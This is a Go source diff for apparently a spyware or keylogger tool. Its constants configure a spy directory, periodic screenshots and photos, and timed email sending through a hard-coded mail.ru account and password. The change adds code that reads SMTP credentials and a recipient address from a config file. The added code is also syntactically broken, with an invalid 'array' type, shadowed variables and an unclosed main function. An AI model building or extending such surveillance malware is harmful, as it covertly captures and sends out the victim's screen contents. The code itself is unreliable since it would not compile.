@@ -7,10 +7,39 @@ import (
 	"log"
 	"os"
 	"time"
-
+	"bufio"
+	"strings"
+	"strconv"
 	screenshot "github.com/vova616/screenshot"
 	gomail "gopkg.in/gomail.v2"
 )
+
+var settings array
+var email string
+var pass string
+var port_int int
+var port_int1 int
+
+func main() {
+
+file, _ := os.Open("config") //имя файла, откуда читаем настройки
+f := bufio.NewReader(file)
+
+fmt.Println("\nВаши настройки:")
+settings, _ := f.ReadString(0)
+fmt.Print(settings)
+arr := strings.Split(settings, "\n")
+fmt.Print("\n")
+
+email := strings.Split(arr[0], ":") 		// Email login
+pass := strings.Split(arr[1], ":")		// Email password
+server := strings.Split(arr[2], ":")		// SMTP-сервер
+port_str := strings.Split(arr[3], ":")		// SMTP-порт
+port := port_str[1]				// SMTP-порт - адский конверт в int
+port_int, _ := strconv.ParseInt(port, 10, 0)	// SMTP-порт - адский конверт в int
+port_int1 = int(port_int)			// SMTP-порт - адский конверт в int
+to := strings.Split(arr[4], ":")		// E-mail получателя
+defer file.Close()
 
 const (
 	// Home directory for spy.
@@ -23,9 +52,9 @@ const (
 	savePhotoInterval = 10
 	// Send email interval.
 	sendEmailInterval = 15
-	// Email login
+	
 	emailLogin = "pspyware@mail.ru"
-	// Email password
+	
 	emailPass = "keylogger11"
 	// Need to save screen shots?
 	isScreenShot = true
